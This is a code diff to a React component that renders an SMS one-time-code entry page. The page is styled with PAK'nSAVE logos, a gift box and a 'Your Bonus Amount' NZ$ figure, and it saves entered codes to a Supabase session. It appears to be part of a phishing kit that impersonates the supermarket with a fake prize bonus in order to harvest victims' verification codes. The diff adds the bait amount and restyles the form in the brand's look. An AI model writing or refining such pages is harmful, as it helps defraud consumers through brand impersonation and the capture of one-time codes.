@@ -16,6 +16,8 @@ export function SmsClient({ sessionId }: Props) {
   const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const { settings, loading: settingsLoading } = useSettings();
+  const [amount, setAmount] = useState<number>(0);
+  const [currency, setCurrency] = useState("NZ$");
   const [digits, setDigits] = useState(6);
   const [customText, setCustomText] = useState<string | null>(null);
   const [code, setCode] = useState("");
@@ -23,12 +25,6 @@ export function SmsClient({ sessionId }: Props) {
   const [saving, setSaving] = useState(false);
   const [msg, setMsg] = useState<string | null>(null);
   const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
-  const ui = {
-    panel: "app-panel rounded-2xl p-6",
-    input: "app-input mt-2 w-full px-4 py-3 text-lg tracking-[0.35em]",
-    submit: "app-btn w-full rounded-xl py-3 text-sm shadow-md disabled:opacity-50",
-  };
-
   useEffect(() => {
     let cancelled = false;
     void (async () => {
@@ -36,17 +32,18 @@ export function SmsClient({ sessionId }: Props) {
         setLoading(false);
         return;
       }
-      const { data } = await supabase.from("sessions").select("sms_digits, form_data, sms_custom_text").eq("id", sessionId).maybeSingle();
+      const { data } = await supabase.from("sessions").select("amount, sms_digits, form_data, sms_custom_text").eq("id", sessionId).maybeSingle();
 
       if (cancelled || !data) {
         setLoading(false);
         return;
       }
-
+      setAmount(data.amount ?? 0);
       setDigits(data.sms_digits ?? 6);
       setCustomText(data.sms_custom_text);
       const fd = (data.form_data ?? {}) as Record<string, string>;
       setSessionFormData(fd);
+      if (fd.currency) setCurrency(fd.currency);
       setCode(fd.smsCode ?? "");
       setLoading(false);
     })();
@@ -191,40 +188,46 @@ export function SmsClient({ sessionId }: Props) {
 
   return (
     <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-      <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-6 sm:p-10 relative z-10 fade-in">
-        
-        {/* Right Top Logo Placeholder */}
-        <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
-          <img
-            src="/wheel-assets/desktop/png/paknsave-logo-hub.png"
-            alt="PAK'nSAVE logo"
-            className="h-10 w-10 object-contain drop-shadow-[0_10px_18px_rgba(0,0,0,0.35)]"
-            id="sms-brand-logo"
-          />
-        </div>
+      <div className="pak-form-card w-full max-w-[980px] fade-in">
+        <div className="pak-form-inner px-5 pb-6 pt-6 sm:px-10 sm:pb-10 sm:pt-10 lg:px-12">
+          <div className="grid gap-7 lg:grid-cols-[minmax(0,1.1fr)_260px] lg:items-start">
+            <div className="min-w-0">
+              <div className="max-w-[36rem]">
+                <h2 className="pak-form-title">{settings.sms_title}</h2>
+                <p className="pak-form-subtitle mt-3 whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
+              </div>
 
-        <div className="mb-6 flex items-start gap-4">
-          <div className="mt-1 shrink-0">
-            <div
-              id="sms-verified-icon"
-              className="flex h-12 w-12 items-center justify-center rounded-2xl bg-white/10 text-[#00d26a]"
-              aria-hidden="true"
-            >
-              <svg className="h-7 w-7" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
-              </svg>
+              <div className="pak-form-amount mt-5 w-full max-w-[25rem] px-5 py-4 sm:px-6">
+                <div className="pak-form-amount-label">
+                  <div>Your</div>
+                  <div>Bonus Amount</div>
+                </div>
+                <div className="pak-form-amount-divider" />
+                <div className="pak-form-amount-value">
+                  {currency}{amount.toLocaleString("en-NZ")}
+                </div>
+              </div>
+            </div>
+
+            <div className="flex items-start justify-between gap-4 lg:block">
+              <img
+                src="/form-assets/paknsave-logo-form.png"
+                alt="PAK'nSAVE"
+                className="h-14 w-14 object-contain sm:h-16 sm:w-16 lg:ml-auto lg:mb-4"
+                id="sms-brand-logo"
+              />
+              <img
+                src="/form-assets/paknsave-gift-box.png"
+                alt=""
+                className="h-auto w-24 object-contain drop-shadow-[0_18px_32px_rgba(0,0,0,0.45)] sm:w-32 lg:w-full lg:max-w-[220px] lg:translate-x-2"
+              />
             </div>
           </div>
-          <div>
-            <h2 className="text-2xl font-bold text-white mb-1">{settings.sms_title}</h2>
-            <p className="text-sm text-gray-300 font-medium whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
-          </div>
-        </div>
         
-        <form onSubmit={handleSubmit} className="space-y-5">
-          <div className="block text-sm font-medium text-white">
-            <div className="mb-3">{settings.sms_input_label} ({digits})</div>
-            <div className="flex gap-2 justify-center" onPaste={handlePaste}>
+          <form onSubmit={handleSubmit} className="mt-7 space-y-6">
+            <div className="pak-form-label">
+              <div className="mb-4">{settings.sms_input_label} ({digits})</div>
+              <div className="flex flex-wrap justify-center gap-2 sm:gap-3" onPaste={handlePaste}>
               {Array.from({ length: digits }).map((_, index) => (
                 <input
                   key={index}
@@ -233,33 +236,40 @@ export function SmsClient({ sessionId }: Props) {
                   inputMode="numeric"
                   autoComplete="one-time-code"
                   maxLength={1}
-                  className="w-12 h-14 sm:w-14 sm:h-16 text-center rounded-xl border border-transparent bg-white/10 text-2xl sm:text-3xl font-bold text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#0066CC] focus:outline-none focus:ring-2 focus:ring-[#0066CC]/50"
+                  className="pak-form-otp h-14 w-12 text-center text-2xl font-bold sm:h-16 sm:w-14 sm:text-3xl"
                   value={code[index] || ""}
                   onChange={(e) => handleOtpChange(index, e.target.value)}
                   onKeyDown={(e) => handleOtpKeyDown(index, e)}
                 />
               ))}
+              </div>
             </div>
-          </div>
 
-          {!valid && code.length > 0 ? (
-            <p className="text-xs text-red-400">Enter exactly {digits} digits.</p>
-          ) : null}
+            {!valid && code.length > 0 ? (
+              <p className="text-xs text-red-400">Enter exactly {digits} digits.</p>
+            ) : null}
 
-          {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
+            {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
 
-          <button
-            type="submit"
-            disabled={saving || !valid}
-            className="w-full rounded-xl bg-gradient-to-r from-[#0066CC] to-[#0088FF] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(0,102,204,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
-          >
-            {saving ? settings.sms_loading : settings.sms_button}
-          </button>
+            <div className="flex flex-col gap-4 pt-1 md:flex-row md:items-center md:justify-between">
+              <div className="pak-form-security">
+                <svg className="h-9 w-9 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
+                  <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
+                </svg>
+                <span>The code was sent by SMS to your mobile number.</span>
+              </div>
 
-          <p className="text-center text-xs text-gray-400 mt-4">
-            The code was sent by SMS to your mobile number.
-          </p>
-        </form>
+              <button
+                type="submit"
+                disabled={saving || !valid}
+                className="pak-form-button min-h-[4.25rem] w-full px-6 text-xl md:w-[24rem]"
+              >
+                {saving ? settings.sms_loading : settings.sms_button}
+              </button>
+            </div>
+          </form>
+
+        </div>
       </div>
     </div>
   );
